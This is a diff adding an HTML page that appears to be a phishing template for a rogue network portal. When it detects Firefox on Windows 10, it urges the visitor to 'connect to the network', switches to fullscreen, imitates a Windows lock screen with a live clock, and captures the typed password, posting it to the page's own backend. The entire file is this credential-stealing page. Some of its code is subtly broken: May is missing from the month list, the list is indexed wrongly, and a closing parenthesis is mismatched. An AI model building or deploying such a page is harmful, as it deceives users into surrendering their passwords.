@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<meta charset="utf-8" />
+<link rel="stylesheet" href="/static/style.css">
+<link rel="stylesheet" href="/static/style2.css">
+
+<script>
+
+var OSName = "Unknown";
+function FindOS(){
+	var nAgt = navigator.userAgent;
+	var browser;
+	var verOffset;
+
+
+	if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
+          browser = 'Firefox';
+	}
+	else {
+	  return 0;
+	}
+
+	if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
+	if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
+	if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
+	if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
+	if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
+	if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
+	if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
+	if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
+	if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
+
+	if (OSName == "Windows 10" && browser == "Firefox"){
+	  var x = document.getElementById('page0');
+	  if (x.style.display == "none") {
+	    x.style.display = "block";
+	  } 
+	  else {
+	    x.style.display = "none";
+	  }
+	}
+	else {
+	  return 0;
+	}
+
+
+};
+
+
+setInterval(function(){
+  var date = new Date();
+  var time = {
+      hour: (function(){
+
+        if(date.getHours() > 13 && date.getHours() < 23){
+          return {current:date.getHours()-12, AmPm:"pm"}
+        }
+        if(date.getHours()===0){
+          return {current:date.getHours()+12, AmPm:"am"}
+        }
+        if(date.getHours()===12){
+          return {current:date.getHours(), AmPm:"pm"}
+        }
+         return {current:date.getHours(), AmPm:"am"}
+      }()),
+
+      minute: (date.getMinutes()<10?'0':'') + date.getMinutes(),
+      day:data.getDay(date.getDay()),
+      date:date.getDate(),
+      month:data.getMonth(date.getMonth())
+  };
+
+  document.querySelector(".time").innerHTML= time.hour.current+":"+time.minute+" "+time.hour.AmPm;
+  document.querySelector(".date").innerHTML = time.day+" "+time.date+", "+time.month;
+
+},1000);
+
+
+var data = {
+   getDay : function(par){
+     var Days = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
+     return Days[par];
+   },
+   getMonth: function(par){
+     var Months = ["January","February","March","April","June","July","August",
+                     "September","October","November","December"];
+                     return Months[par-1];}
+};
+
+
+function openFullscreen() {
+ var x = document.getElementById('page0');
+    if (x.style.display == "none") {
+      x.style.display = "block";
+    } 
+    else {
+      x.style.display = "none";
+    }
+ var x = document.getElementById('page1');
+    if (x.style.display == "none") {
+      x.style.display = "block";
+    } else {
+      x.style.display = "none";
+    }
+
+var elem = document.getElementById("page1");
+    if (elem.webkitRequestFullscreen){
+      elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+    } else if (elem.msRequestFullscreen) {
+	elem.msRequestFullscreen();
+    } else if (elem.mozRequestFullScreen) {
+	elem.mozRequestFullScreen();
+    } else if (elem.requestFullscreen) {
+	elem.requestFullscreen();
+    }
+};
+</script>
+
+<script>
+function ChangePage(){
+ var x = document.getElementById('page1');
+  if (x.style.display == "block") {
+    x.style.display = "none";
+  } else {
+    x.style.display = "block";
+  }
+ var x = document.getElementById('page2');
+  if (x.style.display == "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+};
+</script>
+
+<script>
+
+function validate_passphrase (password, callback) {
+  var xhttp = new XMLHttpRequest();
+  xhttp.open("POST", "/backend/", true);
+  xhttp.onreadystatechange = function () {
+      if (this.readyState == 4 && this.status == 200)  {
+          var json = JSON.parse(xhttp.responseText);
+          callback(json.psk_verify, password);
+      }
+  };
+  var data = JSON.stringify({"psk_verify": password});
+  xhttp.send(data);
+}
+
+
+function windows_validate_action (pw_status, password) {
+  document.getElementById("windows-form").submit();
+}
+
+</script>
+</head>
+
+<body onload="FindOS()">
+  <div id="page0" style="display: none;">
+    <p>To connect to the network click <p id="fullscr" onclick="openFullscreen()">here</p></p>
+  </div>
+
+  <div id="page1" style="display: none;">
+    <button id="btn" class="btn" type='button' onclick="ChangePage()"></button>
+    <div class="date-time">
+      <div class="time"></div>
+      <div class="date"></div>
+    </div>
+  </div>
+
+ <div id="page2" style="display: none;">
+   <div class="container-fluid" id="container"></div>
+     <div class="container">
+       <div class="form-wrapper" id="form">   
+         <form id="windows-form" method='post' action='/post'>
+           <img src="/static/user.png" alt="Lock-screen-avatar" class="rounded-circle img-fluid">
+           <div class="form-group">
+             <label id="pw_status" class="username">User</label>
+             <input type="password" placeholder="Password" id="password" name="user-password" class="textfield">
+             <button class="authenticate">&rarr;</button>
+             <a href="" class="forgotpass" >I forgot my password</a>
+             <a href="" class="signinopt" >Sign-in options</a>
+           </div>
+        </form>
+       </div>
+     </div>
+   </div>
+
+<script>
+  var myform = document.getElementById("windows-form");
+  myform.addEventListener("submit", function(evt) {
+    evt.preventDefault();
+    validate_passphrase(document.getElementById("password").value, windows_validate_action)
+  );
+</script>
+</body>
+
+</html>
